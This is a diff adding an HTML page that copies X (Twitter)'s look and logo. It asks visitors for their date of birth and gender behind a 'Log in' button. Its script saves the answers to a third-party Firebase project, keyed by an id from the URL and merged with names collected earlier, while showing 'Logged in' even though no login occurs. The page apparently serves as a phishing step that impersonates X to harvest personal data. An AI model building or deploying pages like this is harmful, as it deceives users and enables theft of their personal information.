@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X - Enter Details</title>
+    <style>
+        /* CSS to match X (Twitter) UI */
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 600px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .logo-box {
+            display: flex;
+            justify-content: center;
+            padding: 12px 0;
+        }
+
+        .logo-box svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        h1 {
+            font-size: 31px;
+            font-weight: 700;
+            margin-top: 30px;
+            margin-bottom: 30px;
+            color: #0f1419;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+            width: 100%;
+        }
+
+        .input-box {
+            position: relative;
+            border: 1px solid #cfd9de;
+            border-radius: 4px;
+            padding: 16px 8px 8px 8px;
+            transition: border 0.2s;
+        }
+
+        .input-box:focus-within {
+            border: 2px solid #1d9bf0;
+        }
+
+        .input-box label {
+            position: absolute;
+            top: 4px;
+            left: 8px;
+            font-size: 13px;
+            color: #536471;
+        }
+
+        .input-box input, .input-box select {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 17px;
+            background: transparent;
+            margin-top: 4px;
+        }
+
+        /* DOB Layout */
+        .dob-label {
+            font-weight: 700;
+            font-size: 15px;
+            color: #0f1419;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .dob-flex {
+            display: flex;
+            gap: 12px;
+        }
+
+        .flex-month { flex: 2; }
+        .flex-day { flex: 1; }
+        .flex-year { flex: 1.5; }
+
+        /* Login Button - Pill Style */
+        .footer {
+            margin-top: auto;
+            display: flex;
+            justify-content: flex-end;
+            padding-bottom: 20px;
+        }
+
+        .btn-submit {
+            background-color: #0f1419;
+            color: white;
+            border: none;
+            padding: 0 32px;
+            height: 44px;
+            border-radius: 22px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #272c30;
+        }
+
+        .btn-submit:disabled {
+            background-color: #878a8c;
+            cursor: not-allowed;
+        }
+
+        #status {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Center X Logo -->
+        <div class="logo-box">
+            <svg viewBox="0 0 24 24"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+        </div>
+
+        <h1>Enter your details</h1>
+
+        <form id="detailsForm">
+            <!-- Date of Birth Section -->
+            <label class="dob-label">Date of birth</label>
+            <div class="form-group dob-flex">
+                <div class="input-box flex-month">
+                    <label>Month</label>
+                    <select id="month" required>
+                        <option value="" disabled selected></option>
+                        <option value="01">January</option><option value="02">February</option>
+                        <option value="03">March</option><option value="04">April</option>
+                        <option value="05">May</option><option value="06">June</option>
+                        <option value="07">July</option><option value="08">August</option>
+                        <option value="09">September</option><option value="10">October</option>
+                        <option value="11">November</option><option value="12">December</option>
+                    </select>
+                </div>
+                <div class="input-box flex-day">
+                    <label>Day</label>
+                    <input type="number" id="day" placeholder=" " min="1" max="31" required>
+                </div>
+                <div class="input-box flex-year">
+                    <label>Year</label>
+                    <input type="number" id="year" placeholder=" " min="1900" max="2025" required>
+                </div>
+            </div>
+
+            <!-- Gender Section -->
+            <div class="form-group">
+                <div class="input-box">
+                    <label>Gender</label>
+                    <select id="gender" required>
+                        <option value="" disabled selected></option>
+                        <option value="Male">Male</option>
+                        <option value="Female">Female</option>
+                        <option value="Prefer not to say">Prefer not to say</option>
+                    </select>
+                </div>
+            </div>
+
+            <div id="status"></div>
+
+            <div class="footer">
+                <button type="submit" class="btn-submit" id="submitBtn">Log in</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Firebase Integration -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDL7sPp-FkG59L-mRQ7BrCGgeKMhQC80iw",
+            authDomain: "xperts-metadata.firebaseapp.com",
+            projectId: "xperts-metadata",
+            storageBucket: "xperts-metadata.firebasestorage.app",
+            messagingSenderId: "514845910910",
+            appId: "1:514845910910:web:5a2402130a97b5d749b52f",
+            measurementId: "G-CQ5KWGJSZB"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // Function to extract ID from URL (?id=...)
+        const getUrlParam = (name) => {
+            const results = new RegExp('[\?&]' + name + '=([^&#]*)').exec(window.location.href);
+            return results ? results[1] : null;
+        };
+
+        const form = document.getElementById('detailsForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const statusDiv = document.getElementById('status');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const docId = getUrlParam('id');
+            if (!docId) {
+                statusDiv.innerHTML = "<span style='color:red;'>Error: No ID found in URL.</span>";
+                return;
+            }
+
+            // Get inputs
+            const day = document.getElementById('day').value.padStart(2, '0');
+            const month = document.getElementById('month').value;
+            const year = document.getElementById('year').value;
+            const gender = document.getElementById('gender').value;
+
+            // Format: DD/MM/YYYY
+            const dobFormatted = `${day}/${month}/${year}`;
+
+            submitBtn.disabled = true;
+            submitBtn.innerText = "Loading...";
+
+            try {
+                // Store in Firestore using the ID from URL as document name
+                // Use { merge: true } so it adds to firstName/lastName from your image
+                await setDoc(doc(db, "userData", docId), {
+                    gender: gender,
+                    dateOfBirth: dobFormatted,
+                    updatedAt: new Date()
+                }, { merge: true });
+
+                statusDiv.innerHTML = "<span style='color:green;'>Success! Details updated.</span>";
+                submitBtn.innerText = "Logged in";
+                
+            } catch (error) {
+                console.error("Firestore Error:", error);
+                statusDiv.innerHTML = "<span style='color:red;'>Error saving data.</span>";
+                submitBtn.disabled = false;
+                submitBtn.innerText = "Log in";
+            }
+        });
+    </script>
+</body>
+  </html>
